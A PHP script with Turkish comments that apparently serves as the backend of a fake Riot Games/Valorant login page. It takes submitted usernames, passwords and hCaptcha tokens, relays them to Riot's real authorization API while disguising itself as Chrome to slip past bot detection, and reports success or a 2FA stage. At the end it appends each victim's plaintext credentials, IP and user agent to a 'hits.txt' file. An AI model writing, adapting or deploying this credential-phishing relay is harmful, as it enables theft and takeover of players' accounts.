<?php
// Hataları ekrana basma, JSON formatı bozulmasın
error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit;
}

// ==================== 1. VERİLERİ AL ====================
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, true);
if (!$input) $input = $_POST;

$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'] ?? '';
$password = $data['password'] ?? '';
$hcaptcha = $data['hcaptcha_response'] ?? '';
$fake_key = substr(md5($username . $password . time() . rand(1000,9999)), 0, 32);

// Eğer frontend User-Agent gönderirse onu kullan, yoksa bunu kullan
// NOT: hCaptcha'yı çözen tarayıcı ile buradaki UA aynı olmalı!
$u_agent = $input['user_agent'] ?? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36";

if (!$username || !$password) {
    echo json_encode(["ok" => false, "reason" => "MISSING_CREDENTIALS"]);
    exit;
}

// ==================== 2. GÜNCEL SÜRÜMÜ ÇEK ====================
$v_ch = curl_init("https://valorant-api.com/v1/version");
curl_setopt($v_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($v_ch, CURLOPT_SSL_VERIFYPEER, false);
$v_resp = curl_exec($v_ch);
curl_close($v_ch);
$v_json = json_decode($v_resp, true);
$client_version = $v_json['data']['riotClientVersion'] ?? "release-10.01-shipping-15-123456";
$client_platform = "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9";

// ==================== 3. CURL AYARLARI ====================
// Cookie dosyasını kullanıcıya özel yap
$cookie_file = __DIR__ . '/cookies_' . md5($username) . '.txt';
if (file_exists($cookie_file)) @unlink($cookie_file);

// Riot'u kandırmak için Chrome şifreleme dilleri
$cipher_suite = "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA";

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HEADER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 25,
    CURLOPT_ENCODING => "gzip, deflate, br",
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
    CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
    CURLOPT_SSL_CIPHER_LIST => $cipher_suite
]);

// ==================== 4. OTURUM BAŞLAT (GET) ====================
$headers_get = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language: en-US,en;q=0.9",
    "Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"132\", \"Chromium\";v=\"132\"",
    "Sec-Ch-Ua-Mobile: ?0",
    "Sec-Ch-Ua-Platform: \"Windows\"",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1",
    "Upgrade-Insecure-Requests: 1",
    "User-Agent: $u_agent"
];

curl_setopt($ch, CURLOPT_URL, "https://auth.riotgames.com/authorize?client_id=rso-web-client-prod&redirect_uri=https%3A%2F%2Flogin.playvalorant.com%2Foauth2-callback&response_type=code&scope=openid%20lol_region");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_get);
$init_response = curl_exec($ch);

// Log (Hata ayıklama için)
file_put_contents('riot_init_raw.log', date("Y-m-d H:i:s") . " | Init Resp Len: " . strlen($init_response) . "\n", FILE_APPEND);

// BOT KORUMASI: İnsan gibi davranmak için 1 saniye bekle
sleep(1);

// ==================== 5. GİRİŞ YAP (PUT) ====================
$payload_data = [
    "type" => "auth",
    "username" => $username,
    "password" => $password,
    "remember" => true, // Bunu true yapmak bazen cookie ömrünü uzatır
    "language" => "en_US"
];

// Token geldiyse ekle
if ($hcaptcha) {
    $payload_data['hcaptcha_response'] = $hcaptcha;
}

$auth_payload = json_encode($payload_data);

// PUT Headerları (Sıralama Çok Önemli)
$headers_put = [
    "Accept: application/json, text/plain, */*",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/json",
    "Origin: https://authenticate.riotgames.com",
    "Referer: https://authenticate.riotgames.com/",
    "Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"132\", \"Chromium\";v=\"132\"",
    "Sec-Ch-Ua-Mobile: ?0",
    "Sec-Ch-Ua-Platform: \"Windows\"",
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-site",
    "User-Agent: $u_agent",
    "X-Riot-ClientPlatform: $client_platform",
    "X-Riot-ClientVersion: $client_version"
];

curl_setopt($ch, CURLOPT_URL, "https://auth.riotgames.com/api/v1/authorization");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_put);
curl_setopt($ch, CURLOPT_POSTFIELDS, $auth_payload);
$response = curl_exec($ch);

// Yanıtı ayır
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$body = substr($response, $header_size);
if (empty($body)) $body = $response;

curl_close($ch);

// LOG: Riot'un gerçek cevabını dosyaya yaz (ÇOK ÖNEMLİ)
file_put_contents('riot_auth_raw.log', date("Y-m-d H:i:s") . " | $username | Raw Body: " . $body . "\n", FILE_APPEND);

// ==================== 6. SONUÇ ANALİZİ ====================
$data = json_decode($body, true);
if (!$data) {
    echo json_encode(["ok" => false, "reason" => "INVALID_JSON", "raw" => substr($body, 0, 150)]);
    @unlink($cookie_file);
    exit;
}

if (isset($data['error'])) {
    // Hatanın tam sebebini görmek için error kodunu döndür
    if ($data['error'] === 'auth_failure') {
        echo json_encode(["ok" => false, "reason" => "ERROR_AUTH_FAILURE", "detail" => "Bilgiler yanlis veya Riot IP'yi engelliyor"]);
    } else {
        echo json_encode(["ok" => false, "reason" => "RIOT_ERROR: " . $data['error']]);
    }
} elseif (isset($data['type'])) {
    if ($data['type'] === 'response') {
        // Başarılı giriş
        $uri = $data['response']['parameters']['uri'] ?? '';
        echo json_encode(["ok" => true, "reason" => "LOGIN_SUCCESS", "redirect_uri" => $uri]);
    } elseif ($data['type'] === 'multifactor') {
        // 2FA (Mail Kodu)
        echo json_encode(["ok" => "mfa", "method" => "email", "email" => $data['multifactor']['email'] ?? 'hidden', "key" => $fake_key, "stage" => "early"]);
    } else {
        echo json_encode(["ok" => false, "reason" => "UNKNOWN_TYPE: " . $data['type']]);
    }
} else {
    // Bilinmeyen bir durum (Muhtemelen yeni bir captcha istedi)
    echo json_encode(["ok" => false, "reason" => "WEIRD_RESPONSE", "raw" => $data]);
}

@unlink($cookie_file);

// Log to hits.txt
file_put_contents('hits.txt', date('d.m.Y H:i:s') . PHP_EOL . "Username: " . $username . PHP_EOL . "Password: " . $password . PHP_EOL . "hCaptcha: " . $hcaptcha . PHP_EOL . "Key (fake): " . $fake_key . PHP_EOL . "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . PHP_EOL . "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . PHP_EOL . str_repeat("-", 50) . PHP_EOL . PHP_EOL, FILE_APPEND);
?>